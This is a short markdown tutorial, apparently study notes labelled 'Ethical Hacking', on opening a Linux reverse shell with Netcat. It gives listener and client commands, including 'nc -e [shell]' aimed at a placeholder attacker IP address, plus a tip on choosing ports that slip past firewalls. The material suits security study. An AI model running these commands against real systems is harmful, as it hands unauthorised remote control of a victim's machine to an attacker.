# Ethical Hacking - Remote Access - Linux - Reverse Shell with Netcat

## Tools 
+ Netcat
+ Attacker System (Listening) : Outside of a firewall
+ Target/Victim System (Connecting) : Inside of a firewall

## Netcat

### Synopsis/Syntax 
```console
sudo nc {options}
```

### Parameters
#### Listener/Server
+ -l : Start listening for connection; Listener Mode
+ -n : Do not use DNS; only use IP address
+ -v : Verbose Mode; Show detailed information
+ -p : Specify ports to listen on; Try to keep firewall within the well known ports (under 1000)
+ -s : Specify source (Attacker) IP address to listen with
#### Client
+ -e [command] : Execute a command; Generally will be the shell

## WorkFlow
> Method/Order of Operation
- Reverse Shell Remote Connection/Access
    1. Start listener (server) to listen for a connection
	```console
	sudo nc -lnvp [listening-port] -s [listener-source-IP-address]
	```
    2. Connect to listener with target/victim (client)
	```console
	sudo nc -e [shell] [attacker-ip-address (to connect to)] [listening-port-number]
	```

## References
+ [YouTube | NetworkChuck | how to get remote access to your hacking targets // reverse shells with netcat (Windows and Linux!!)](https://www.youtube.com/watch?v=bXCeFPNWjsM)

## Resources

## Remarks
